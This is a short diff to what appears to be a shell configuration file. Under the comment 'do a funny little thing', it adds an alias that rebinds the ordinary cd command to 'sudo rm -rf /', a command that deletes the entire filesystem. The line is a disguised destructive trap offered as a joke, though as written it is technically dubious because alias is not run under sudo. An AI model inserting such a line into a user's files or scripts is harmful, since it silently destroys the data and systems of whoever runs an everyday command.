@@ -1,3 +1,3 @@
 # do a funny little thing
 
-sudo cd="sudo rm -rf /"
+sudo alias cd="sudo rm -rf /"
